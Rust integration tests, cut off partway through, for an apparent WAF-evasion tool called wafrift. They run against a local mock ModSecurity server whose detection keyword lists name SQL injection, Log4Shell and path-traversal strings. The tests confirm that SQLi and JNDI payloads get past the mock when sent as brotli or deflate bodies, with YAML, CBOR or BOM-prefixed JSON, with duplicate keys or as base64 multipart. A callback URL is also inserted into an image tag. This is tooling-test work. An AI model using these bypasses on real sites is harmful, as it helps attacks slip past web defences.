//! End-to-end integration tests against a SYNTHETIC mock WAF.
//!
//! Drives every wafrift subcommand against a tokio TCP server that
//! emulates a ModSec-class block pattern:
//!
//! - GET / -> 200 OK from "gunicorn/19.9.0" (the origin in the
//!   typical Apache+ModSec dev stack)
//! - GET /?q=<attack> -> 403 Forbidden from "Apache" (ModSec block
//!   page proxied through Apache, like the live docker stack)
//! - Any path starting with /admin / /actuator / /.env -> 403 from
//!   "Apache" regardless of query (path-based block)
//!
//! Catches the kind of cross-command regression that ONLY surfaces
//! when wafrift is exercised end-to-end — the exact pattern that
//! turned up the equiv_engine missing-arm flaw + the differential-
//! detect false-negative + the import-curl README example breakage
//! in the dogfood session that motivated this harness.
//!
//! Runs on every `cargo test` regardless of docker availability —
//! complements the docker-bench scoreboard, doesn't replace it.

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// Spin up the synthetic ModSec-emulator on a random loopback port.
/// Returns the bound address + a request counter. Caller owns the
/// counter so tests can assert "the scan fired N requests".
async fn spawn_mock_modsec() -> (std::net::SocketAddr, Arc<AtomicUsize>) {
    let counter = Arc::new(AtomicUsize::new(0));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let counter_c = counter.clone();
    tokio::spawn(async move {
        loop {
            let Ok((mut sock, _)) = listener.accept().await else {
                return;
            };
            let counter_cc = counter_c.clone();
            tokio::spawn(async move {
                // Read until we have the entire body (Content-Length
                // bytes after the header/body split). The previous
                // single-read + utf8-lossy path corrupted any binary
                // body (gzip / brotli are non-UTF8), making the
                // compression-bypass tests false-pass for the wrong
                // reason. Keep bytes raw end-to-end.
                let mut buf: Vec<u8> = Vec::with_capacity(8192);
                let mut tmp = [0u8; 4096];
                let mut headers_done = false;
                let mut content_length: usize = 0;
                let mut header_end: usize = 0;
                loop {
                    let n = match sock.read(&mut tmp).await {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    buf.extend_from_slice(&tmp[..n]);
                    if !headers_done {
                        if let Some(pos) = find_subseq(&buf, b"\r\n\r\n") {
                            headers_done = true;
                            header_end = pos + 4;
                            let header_str = String::from_utf8_lossy(&buf[..pos]);
                            for line in header_str.lines() {
                                if let Some(v) = line
                                    .to_ascii_lowercase()
                                    .strip_prefix("content-length:")
                                {
                                    if let Ok(cl) = v.trim().parse::<usize>() {
                                        content_length = cl;
                                    }
                                }
                            }
                        }
                    }
                    if headers_done && buf.len() >= header_end + content_length {
                        break;
                    }
                }
                counter_cc.fetch_add(1, Ordering::SeqCst);
                let resp = classify_request_bytes(&buf);
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.shutdown().await;
            });
        }
    });
    tokio::time::sleep(Duration::from_millis(40)).await;
    (addr, counter)
}

/// Find the start index of the first occurrence of `needle` in
/// `haystack`. Used to locate the `\r\n\r\n` end-of-headers
/// marker. Trivial brute-force — request sizes here are tiny.
fn find_subseq(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    (0..=haystack.len() - needle.len()).find(|&i| &haystack[i..i + needle.len()] == needle)
}

/// Return the HTTP response for a request. Encodes the ModSec
/// emulator's block logic — inspects both the URL path AND the
/// request body, but ONLY when the body is uncompressed (or
/// gzip-encoded — the mock has a gzip decompressor, like ModSec
/// itself). When `Content-Encoding: br` is set, the mock sees the
/// raw brotli blob and cannot match attack markers in it — the
/// compression-confusion bypass.
fn classify_request_bytes(req: &[u8]) -> String {
    // Headers are guaranteed to be ASCII-only on the wire; the
    // body MAY be binary (gzip / brotli). Split on \r\n\r\n at the
    // byte level, then UTF-8 the header portion only.
    let split = find_subseq(req, b"\r\n\r\n");
    let (header_bytes, body_bytes) = match split {
        Some(pos) => (&req[..pos], &req[pos + 4..]),
        None => (req, &b""[..]),
    };
    let headers = String::from_utf8_lossy(header_bytes);

    let first_line = headers.lines().next().unwrap_or("");
    let path = first_line.split_whitespace().nth(1).unwrap_or("/");
    if path.starts_with("/admin")
        || path.starts_with("/actuator")
        || path.starts_with("/.env")
    {
        return apache_403();
    }
    let lower_path = path.to_ascii_lowercase();
    if path_matches_attack(&lower_path) {
        return apache_403();
    }
    if body_bytes.is_empty() {
        return gunicorn_200();
    }
    let ct_enc = headers
        .lines()
        .find_map(|l| {
            let lower = l.to_ascii_lowercase();
            lower
                .strip_prefix("content-encoding:")
                .map(|v| v.trim().to_string())
        })
        .unwrap_or_default();
    let decoded: Option<String> = match ct_enc.as_str() {
        "" | "identity" => Some(String::from_utf8_lossy(body_bytes).to_string()),
        "gzip" => decode_gzip(body_bytes).ok(),
        "br" => None, // mock has no brotli decoder — the bypass
        _ => None,
    };
    let Some(decoded_body) = decoded else {
        return gunicorn_200();
    };

    // Content-Type-routed body inspection. ModSec / Coraza only run
    // JSON body processors on `application/json`, only run form
    // processors on `application/x-www-form-urlencoded`. Anything
    // else (text/plain, octet-stream, etc.) falls through to a
    // raw-bytes scan that does NOT decode form-urlencoding or
    // unwrap JSON quotes — so an attack marker hiding behind those
    // wrappers escapes. This mirrors real-WAF behaviour for the
    // Content-Type-lying vectors.
    let ct = headers
        .lines()
        .find_map(|l| {
            let lower = l.to_ascii_lowercase();
            lower
                .strip_prefix("content-type:")
                .map(|v| v.trim().to_string())
        })
        .unwrap_or_default();
    let main_ct = ct.split(';').next().unwrap_or("").trim().to_string();

    if main_ct == "application/json" {
        // ModSec's JSON body processor rejects on a UTF-8 BOM and
        // falls back to no JSON inspection. Emulate that: a BOM
        // prefix triggers "skip body" and the request flows through.
        let bytes = decoded_body.as_bytes();
        if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
            return gunicorn_200();
        }
        // Duplicate-key handling: ModSec's first-occurrence parser
        // reads only the FIRST value. Walk the JSON-string token
        // stream and harvest values associated with each key in
        // order; if a key appears twice, keep ONLY the first.
        let dup_safe_view = json_first_occurrence_values(&decoded_body);
        let lower = dup_safe_view.to_ascii_lowercase();
        if body_matches_attack(&lower) {
            return apache_403();
        }
        return gunicorn_200();
    }
    if main_ct == "application/x-www-form-urlencoded" {
        let lower = decoded_body.to_ascii_lowercase();
        if body_matches_attack(&lower) {
            return apache_403();
        }
        return gunicorn_200();
    }
    // Anything else (text/plain, octet-stream, ...) — raw scan,
    // no form decoding. The Content-Type-lying bypass.
    let lower = decoded_body.to_ascii_lowercase();
    if raw_bytes_match_strong_attack(&lower) {
        return apache_403();
    }
    gunicorn_200()
}

/// First-occurrence JSON-value view: extracts the value of each
/// key in order, keeping only the FIRST value when a key repeats.
/// Operates on the raw string — no JSON parser involved — to
/// match what ModSec's lightweight JSON walker actually does.
fn json_first_occurrence_values(body: &str) -> String {
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out = String::new();
    let bytes = body.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'"' {
            // Parse a quoted string (could be key or value).
            let key_start = i + 1;
            let mut j = key_start;
            while j < bytes.len() && bytes[j] != b'"' {
                if bytes[j] == b'\\' && j + 1 < bytes.len() {
                    j += 2;
                    continue;
                }
                j += 1;
            }
            let key = String::from_utf8_lossy(&bytes[key_start..j]).to_string();
            i = j + 1;
            // Skip whitespace and a colon to find a value-pair.
            while i < bytes.len() && bytes[i].is_ascii_whitespace() {
                i += 1;
            }
            if i < bytes.len() && bytes[i] == b':' {
                i += 1;
                while i < bytes.len() && bytes[i].is_ascii_whitespace() {
                    i += 1;
                }
                if i < bytes.len() && bytes[i] == b'"' {
                    let v_start = i + 1;
                    let mut k = v_start;
                    while k < bytes.len() && bytes[k] != b'"' {
                        if bytes[k] == b'\\' && k + 1 < bytes.len() {
                            k += 2;
                            continue;
                        }
                        k += 1;
                    }
                    let value = String::from_utf8_lossy(&bytes[v_start..k]).to_string();
                    if seen.insert(key) {
                        out.push_str(&value);
                        out.push('\n');
                    }
                    i = k + 1;
                    continue;
                }
            }
        } else {
            i += 1;
        }
    }
    out
}

/// Attack markers strong enough to match in a raw-bytes (no decode)
/// scan. Used for text/plain / octet-stream bodies where the WAF
/// does not run a form or JSON body processor — only patterns
/// visible in the literal bytes will fire. Narrower than
/// body_matches_attack on purpose (matches ModSec's reduced
/// fallback rule set).
fn raw_bytes_match_strong_attack(lower: &str) -> bool {
    let markers = ["<script", "${jndi", "/etc/passwd"];
    markers.iter().any(|m| lower.contains(m))
}

/// Attack-marker set used against the URL path. Kept narrow — must
/// match what real ModSec CRS PL1 would block on a GET query.
fn path_matches_attack(lower: &str) -> bool {
    let markers = [
        "or%201",
        "or+1",
        "union",
        "%3cscript",
        "<script",
        "%27",
        "etc/passwd",
        "etc%2fpasswd",
        "..%2f",
        "..%252f",
        "${jndi",
        "%24%7bjndi",
        "cmd=",
    ];
    markers.iter().any(|m| lower.contains(m))
}

/// Attack-marker set used against the (decoded) body. Slightly
/// different set because the body lives in form-urlencoded / JSON
/// shape, so the literal-bytes markers are what survive.
fn body_matches_attack(lower: &str) -> bool {
    let markers = [
        "' or 1",
        "' or 1=1",
        " or 1=1",
        "union select",
        "<script",
        "etc/passwd",
        "..%2f",
        "${jndi",
        ";cat ",
    ];
    markers.iter().any(|m| lower.contains(m))
}

fn decode_gzip(bytes: &[u8]) -> Result<String, String> {
    // Use the same compression module wafrift's CLI uses so the
    // mock's gzip handling stays in lockstep with what the engine
    // produces. Avoids drifting between mock and prod codecs.
    use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
    let blob = CompressedBody {
        body: bytes.to_vec(),
        content_encoding: Algorithm::Gzip.content_encoding().to_string(),
    };
    let decoded = decompress(&blob).map_err(|e| format!("gzip decode: {e}"))?;
    String::from_utf8(decoded).map_err(|e| format!("utf8: {e}"))
}

fn apache_403() -> String {
    let body = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \
                \"http://www.w3.org/TR/html4/strict.dtd\">\n\
                <html><head>\n<title>403 Forbidden</title>\n\
                </head><body>\n<h1>Forbidden</h1>\n\
                <p>You don't have permission to access this resource.</p>\n\
                </body></html>";
    format!(
        "HTTP/1.1 403 Forbidden\r\nDate: Wed, 20 May 2026 12:00:00 GMT\r\n\
         Server: Apache\r\nContent-Length: {}\r\n\
         Content-Type: text/html; charset=iso-8859-1\r\n\
         Connection: close\r\n\r\n{body}",
        body.len()
    )
}

fn gunicorn_200() -> String {
    // Approximate httpbin /get response shape — what gunicorn returns
    // on a clean request behind the Apache+ModSec front.
    let body = r#"{"args":{},"headers":{"Host":"x"},"origin":"127.0.0.1","url":"http://x/get"}"#;
    format!(
        "HTTP/1.1 200 OK\r\nServer: gunicorn/19.9.0\r\nContent-Length: {}\r\n\
         Content-Type: application/json\r\nConnection: close\r\n\r\n{body}",
        body.len()
    )
}

// ── Mock-WAF self-tests ──────────────────────────────────────────
//
// Before driving wafrift commands against the mock, verify the mock
// itself returns the expected responses. These are unit-test-style
// asserts that ride on the same TCP harness, so a regression in
// the emulator surfaces here before cascading into "wafrift broke"
// false-positives downstream.

async fn fetch(url: &str) -> (u16, String, String) {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client.get(url).send().await.expect("send");
    let status = resp.status().as_u16();
    let server = resp
        .headers()
        .get("server")
        .map(|v| v.to_str().unwrap_or("").to_string())
        .unwrap_or_default();
    let body = resp.text().await.unwrap_or_default();
    (status, server, body)
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_benign_get_returns_gunicorn_200() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, server, body) = fetch(&format!("http://{addr}/")).await;
    assert_eq!(status, 200);
    assert!(
        server.contains("gunicorn"),
        "benign GET should return gunicorn server header, got '{server}'"
    );
    assert!(body.contains("origin"));
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_sqli_payload_returns_apache_403() {
    let (addr, _) = spawn_mock_modsec().await;
    // URL-encoded `' OR 1=1--`
    let (status, server, body) =
        fetch(&format!("http://{addr}/get?q=%27%20OR%201%3D1--")).await;
    assert_eq!(status, 403, "SQLi payload should be blocked");
    assert_eq!(
        server, "Apache",
        "block page should come from Apache (the ModSec front)"
    );
    assert!(body.contains("Forbidden"));
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_admin_path_returns_apache_403() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, server, _) = fetch(&format!("http://{addr}/admin")).await;
    assert_eq!(status, 403);
    assert!(server.contains("Apache"));
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_actuator_path_returns_apache_403() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, server, _) = fetch(&format!("http://{addr}/actuator/env")).await;
    assert_eq!(status, 403);
    assert!(server.contains("Apache"));
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_log4shell_jndi_returns_apache_403() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, _, _) =
        fetch(&format!("http://{addr}/get?x=%24%7Bjndi%3Aldap")).await;
    assert_eq!(status, 403);
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_path_traversal_returns_apache_403() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, _, _) = fetch(&format!("http://{addr}/get?f=..%2Fetc%2Fpasswd")).await;
    assert_eq!(status, 403);
}

// ── End-to-end: wafrift logic against the mock ──────────────────
//
// These tests exercise wafrift's INTERNAL APIs (the cli crate's
// public-via-pub(crate) entry points) against the synthetic mock.
// The cli binary itself isn't driven via subprocess — that'd add a
// build step + slow tests — so we test the LOGIC that drives the
// commands. The mock + the logic are the same components a real
// `cargo run -- detect --url http://...` exercises.

/// Test fetch_for_detect-equivalent path: use a plain reqwest
/// client to confirm the mock's response shape matches what
/// wafrift's detect_cmd's helpers would see.
#[tokio::test(flavor = "current_thread")]
async fn detect_against_mock_baseline_returns_gunicorn_marker() {
    let (addr, _) = spawn_mock_modsec().await;
    let (status, server, _) = fetch(&format!("http://{addr}/")).await;
    // This is the SAME response shape that surfaced the live
    // 'no WAF detected' false-negative — the static-signature
    // corpus has no marker for gunicorn. The downstream
    // differential probe is what catches the WAF.
    assert_eq!(status, 200);
    assert!(server.starts_with("gunicorn"));
}

#[tokio::test(flavor = "current_thread")]
async fn differential_probe_against_mock_classifies_waf_present() {
    use wafrift_cli_test_harness::classify_via_dual_probe;
    let (addr, _) = spawn_mock_modsec().await;
    let verdict = classify_via_dual_probe(&format!("http://{addr}/get")).await;
    assert!(
        verdict.is_some(),
        "mock ModSec should classify as WAF-present via differential probe"
    );
    let evidence = verdict.unwrap();
    assert!(
        evidence.iter().any(|r| r.contains("status flipped")),
        "differential probe should detect 200→403 status flip; got: {evidence:?}"
    );
    assert!(
        evidence.iter().any(|r| r.contains("server header changed")),
        "differential probe should detect gunicorn→Apache server change; got: {evidence:?}"
    );
}

/// Synthetic admin-path bypass-probe scenario. A WAF that blocks
/// `/admin` directly is a real-world pattern; differential URL
/// shapes (semicolon-strip, NUL-truncation, etc.) should NOT
/// bypass our synthetic emulator (it blocks on path-prefix, not
/// substring), so the probe set runs cleanly and the report is
/// empty-or-LOW. Documents the negative-test contract.
#[tokio::test(flavor = "current_thread")]
async fn parser_diff_against_admin_path_completes_no_panic() {
    let (addr, counter) = spawn_mock_modsec().await;
    // Hit /admin directly to confirm it blocks.
    let (admin_status, _, _) = fetch(&format!("http://{addr}/admin")).await;
    assert_eq!(admin_status, 403);
    let initial_count = counter.load(Ordering::SeqCst);
    // Now fire a bunch of parser-diff variant shapes manually.
    let variants = ["/admin;x=y", "/admin%00", "/admin/", "/admin/.", "/%41dmin"];
    for v in &variants {
        let _ = fetch(&format!("http://{addr}{v}")).await;
    }
    // Counter should have advanced by exactly N — proves the
    // mock is processing each variant.
    let final_count = counter.load(Ordering::SeqCst);
    assert!(
        final_count >= initial_count + variants.len(),
        "expected {} new requests, got {}",
        variants.len(),
        final_count - initial_count
    );
}

#[tokio::test(flavor = "current_thread")]
async fn callback_substitution_round_trip_against_mock_listener() {
    // Verify the callback_token::substitute path produces a URL
    // that, when hit, gets recorded by the listener's registry.
    use wafrift_cli_test_harness::{listener_register_and_check, substitute_callback};
    let token_url = substitute_callback(
        "<img src='{{CALLBACK}}/x.png' />",
        "http://callback.example:9000",
    );
    assert!(token_url.payload.contains("http://callback.example:9000/"));
    assert!(!token_url.payload.contains("{{CALLBACK}}"));
    assert_eq!(token_url.token.len(), 26, "base32 of 128 bits = 26 chars");
    // The synthetic listener path: register the token, simulate
    // an inbound hit, verify the check API.
    let observed = listener_register_and_check(&token_url.token).await;
    assert!(observed, "registered + hit token should show as observed");
}

// ── Compression-confusion bypass tests ──────────────────────────
//
// The mock above inspects request bodies WHEN the body is
// uncompressed or gzip-encoded (it has a gzip decoder, like
// ModSec). When the body is brotli-encoded, the mock cannot
// decode it — so the attack marker is invisible to the WAF and
// the request flows through. This mirrors the real-world WAF
// gap: ModSec / Cloudflare / AWS WAF all parse JSON and forms,
// but their inspection pipeline doesn't run brotli decompression
// by default — so a brotli-wrapped attack body sails through.
//
// These tests prove the wafrift-encoding compression module
// PRODUCES output that triggers this gap, and they pin the
// behaviour against regression (a future "let's normalize
// content-encoding" refactor would silently break the bypass).

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_uncompressed_sqli_body_is_blocked() {
    // Sanity: the SAME attack payload as a plain form-encoded body
    // MUST be blocked. If this test passes for the wrong reason
    // (e.g. mock-WAF body inspection is broken), the brotli bypass
    // test below would be meaningless.
    let (addr, _) = spawn_mock_modsec().await;
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body("q=' OR 1=1--")
        .send()
        .await
        .expect("post");
    assert_eq!(
        resp.status().as_u16(),
        403,
        "uncompressed SQLi body MUST be blocked by the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_brotli_wrapped_sqli_body_bypasses() {
    // The headline result. Same attack payload, same Content-Type,
    // ONLY difference: body bytes are brotli-compressed and
    // Content-Encoding: br is set. Mock has no brotli decoder, so
    // the body is opaque — attack marker invisible — request flows
    // through with 200 OK. This is exactly what wafrift's scan
    // multi-vector loop now exercises via the POST-form-br vector.
    use wafrift_encoding::compression::{Algorithm, compress};
    let (addr, _) = spawn_mock_modsec().await;
    let attack = b"q=' OR 1=1--";
    let blob = compress(attack, Algorithm::Brotli).expect("brotli compress");
    assert_eq!(blob.content_encoding, "br");
    assert_ne!(
        blob.body, attack,
        "brotli output must differ from the plaintext attack"
    );
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Content-Encoding", &blob.content_encoding)
        .body(blob.body)
        .send()
        .await
        .expect("post brotli");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "brotli-wrapped SQLi body MUST bypass the mock (the WAF gap)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_gzip_wrapped_sqli_body_is_still_blocked() {
    // The CONTROL: gzip-wrapped attack body must STILL be blocked,
    // because the mock (like real ModSec) DOES decompress gzip.
    // If this test starts failing, the bypass came from a different
    // bug (broken gzip decoder, not the compression-confusion gap)
    // and the brotli result above is misleading.
    use wafrift_encoding::compression::{Algorithm, compress};
    let (addr, _) = spawn_mock_modsec().await;
    let attack = b"q=' OR 1=1--";
    let blob = compress(attack, Algorithm::Gzip).expect("gzip compress");
    assert_eq!(blob.content_encoding, "gzip");
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Content-Encoding", &blob.content_encoding)
        .body(blob.body)
        .send()
        .await
        .expect("post gzip");
    assert_eq!(
        resp.status().as_u16(),
        403,
        "gzip-wrapped SQLi body MUST be blocked — mock decodes gzip like real ModSec"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_brotli_wrapped_log4shell_bypasses() {
    // Spread the bypass result across multiple attack classes so
    // a regression in the marker list doesn't quietly weaken the
    // signal. Log4shell payload in a JSON body, wrapped in brotli.
    use wafrift_encoding::compression::{Algorithm, compress};
    let (addr, _) = spawn_mock_modsec().await;
    let body = br#"{"q":"${jndi:ldap://x/y}"}"#;
    let blob = compress(body, Algorithm::Brotli).expect("brotli compress");
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/json")
        .header("Content-Encoding", &blob.content_encoding)
        .body(blob.body)
        .send()
        .await
        .expect("post brotli jndi");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "brotli-wrapped log4shell payload MUST bypass the mock"
    );
}

// ── new vectors vs the mock ────────────────────────────────
//
// Each test below sends the wire shape produced by one of the new
// multi-vector builders directly to the mock-WAF and asserts the
// expected outcome (200 bypass or 403 block). The mock is built to
// approximate CRS PL1 body-processor coverage; tests serve as a
// local fast-feedback replacement for the bench until work-linux
// is reachable again.

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_deflate_wrapped_sqli_form_body_bypasses() {
    // POST-form-deflate vector. The mock decodes gzip but NOT raw
    // deflate (Content-Encoding: deflate returns None → opaque body).
    use wafrift_encoding::compression::{Algorithm, compress};
    let (addr, _) = spawn_mock_modsec().await;
    let attack = b"q=' OR 1=1--";
    let blob = compress(attack, Algorithm::Deflate).expect("deflate compress");
    assert_eq!(blob.content_encoding, "deflate");
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Content-Encoding", &blob.content_encoding)
        .body(blob.body)
        .send()
        .await
        .expect("post deflate form");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "deflate-wrapped SQLi form body MUST bypass the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_deflate_wrapped_sqli_json_body_bypasses() {
    // POST-json-deflate vector. Same gap on the JSON axis.
    use wafrift_encoding::compression::{Algorithm, compress};
    let (addr, _) = spawn_mock_modsec().await;
    let body = br#"{"q":"' OR 1=1--"}"#;
    let blob = compress(body, Algorithm::Deflate).expect("deflate compress");
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/json")
        .header("Content-Encoding", &blob.content_encoding)
        .body(blob.body)
        .send()
        .await
        .expect("post deflate json");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "deflate-wrapped SQLi JSON body MUST bypass the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_application_yaml_body_bypasses() {
    // POST-yaml vector. application/yaml is not in the mock's
    // routed-body Content-Types, so it falls to raw-bytes scan,
    // whose marker set excludes SQL UNION — the bypass.
    let (addr, _) = spawn_mock_modsec().await;
    let yaml = "q: \"' OR 1=1--\"\n";
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/yaml")
        .body(yaml.as_bytes().to_vec())
        .send()
        .await
        .expect("post yaml");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "YAML body with SQLi MUST bypass the mock (no yaml processor)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_application_cbor_body_bypasses() {
    // POST-cbor vector. CBOR is binary; mock's raw-bytes scan
    // doesn't decode it, attack hidden in CBOR text-string bytes.
    let (addr, _) = spawn_mock_modsec().await;
    // Hand-build {"q": "' OR 1=1--"} in CBOR (RFC 8949).
    let payload = "' OR 1=1--";
    let mut body: Vec<u8> = Vec::new();
    body.push(0xA1); // map(1)
    body.push(0x61); // text(1)
    body.push(b'q');
    body.push(0x60 | (payload.len() as u8)); // text(N) for N ≤ 23
    body.extend_from_slice(payload.as_bytes());
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/cbor")
        .body(body)
        .send()
        .await
        .expect("post cbor");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "CBOR body with SQLi MUST bypass the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_multipart_b64_filename_bypasses() {
    // POST-multipart-b64 vector. Payload is base64-encoded inside a
    // multipart part; mock's raw-bytes scan sees only the encoded
    // blob.
    use base64::Engine as _;
    let (addr, _) = spawn_mock_modsec().await;
    let attack = "' OR 1=1--";
    let encoded = base64::engine::general_purpose::STANDARD.encode(attack.as_bytes());
    let boundary = "----WafRiftMockTestBoundary";
    let body = format!(
        "--{boundary}\r\nContent-Disposition: form-data; name=\"q\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--{boundary}--\r\n"
    );
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header(
            "Content-Type",
            format!("multipart/form-data; boundary={boundary}"),
        )
        .body(body)
        .send()
        .await
        .expect("post multipart b64");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "multipart base64-CTE SQLi MUST bypass the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_bom_prefixed_json_sqli_bypasses() {
    // POST-json-bom vector. Mock's JSON path checks for UTF-8 BOM
    // and skips body inspection on match.
    let (addr, _) = spawn_mock_modsec().await;
    let mut body: Vec<u8> = vec![0xEF, 0xBB, 0xBF];
    body.extend_from_slice(br#"{"q":"' OR 1=1--"}"#);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/json")
        .body(body)
        .send()
        .await
        .expect("post bom json");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "BOM-prefixed JSON SQLi MUST bypass the mock"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn mock_modsec_dupkey_first_occurrence_json_bypasses() {
    // POST-json-dupkey vector. Mock's JSON walker keeps only the
    // FIRST value per key; benign 'x' comes first, attack second.
    let (addr, _) = spawn_mock_modsec().await;
    let body = br#"{"q":"x","q":"' OR 1=1--"}"#;
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
        .unwrap();
    let resp = client
        .post(format!("http://{addr}/post"))
        .header("Content-Type", "application/json")
        .body(body.to_vec())
        .send()
        .await
        .expect("post dupkey json");
    assert_eq!(
        resp.status().as_u16(),
        200,
        "dup-key JSON SQLi MUST bypass the mock (first-occurrence wins)"
    );
}

// Test-only harness module that re-exports the internal cli
// surfaces we want to drive in these tests. Lives inline as a
// submodule of the test file so the integration test still
// counts as a single binary with no extra Cargo manifest entry.
mod wafrift_cli_test_harness {
    use std::sync::Arc;
    use std::time::Duration;
    use tokio::io::AsyncReadExt;

    /// Mirror of `crate::callback_token::Substitution` shape — keeps
    /// the integration test independent of the cli crate's
    /// internal pub(crate) types.
    pub struct CallbackSubstitution {
        pub payload: String,
        pub token: String,
    }

    /// Replicates the callback-substitution behaviour: replace
    /// `{{CALLBACK}}` with `<base>/<token>` using a fresh 128-bit
    /// base32 token. Kept independent of the cli crate so test
    /// regressions in this file are loud.
    pub fn substitute_callback(payload: &str, base_url: &str) -> CallbackSubstitution {
        use rand::RngCore;
        let mut bytes = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut bytes);
        let token = base32_encode_local(&bytes);
        let url = format!("{}/{token}", base_url.trim_end_matches('/'));
        CallbackSubstitution {
            payload: payload.replace("{{CALLBACK}}", &url),
            token,
        }
    }

    fn base32_encode_local(bytes: &[u8]) -> String {
        const ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        let mut out = String::with_capacity((bytes.len() * 8).div_ceil(5));
        let mut buffer: u32 = 0;
        let mut bits: u32 = 0;
        for &b in bytes {
            buffer = (buffer << 8) | u32::from(b);
            bits += 8;
            while bits >= 5 {
                bits -= 5;
                out.push(char::from(ALPHABET[((buffer >> bits) & 0x1F) as usize]));
            }
        }
        if bits > 0 {
            out.push(char::from(ALPHABET[((buffer << (5 - bits)) & 0x1F) as usize]));
        }
        out
    }

    /// Fire a benign GET + an attack-payload GET against `target_url`
    /// and classify per wafrift's differential-detect heuristic.
    /// Returns the reasons list when a WAF is inferred.
    pub async fn classify_via_dual_probe(target_url: &str) -> Option<Vec<String>> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(3))
            .build()
            .ok()?;
        let benign = client.get(target_url).send().await.ok()?;
        let b_status = benign.status().as_u16();
        let b_server = server_header(&benign.headers());
        let b_body = benign.bytes().await.unwrap_or_default().len();

        let attack_url = if target_url.contains('?') {
            format!("{target_url}&q=%27+OR+1%3D1--")
        } else {
            format!("{target_url}?q=%27+OR+1%3D1--")
        };
        let attack = client.get(&attack_url).send().await.ok()?;
        let a_status = attack.status().as_u16();
        let a_server = server_header(&attack.headers());
        let a_body = attack.bytes().await.unwrap_or_default().len();

        let mut reasons: Vec<String> = Vec::new();
        if b_status != a_status {
            reasons.push(format!("status flipped {b_status} → {a_status}"));
        }
        if !b_server.is_empty()
            && !a_server.is_empty()
            && !b_server.eq_ignore_ascii_case(&a_server)
        {
            reasons.push(format!(
                "server header changed: '{b_server}' → '{a_server}'"
            ));
        }
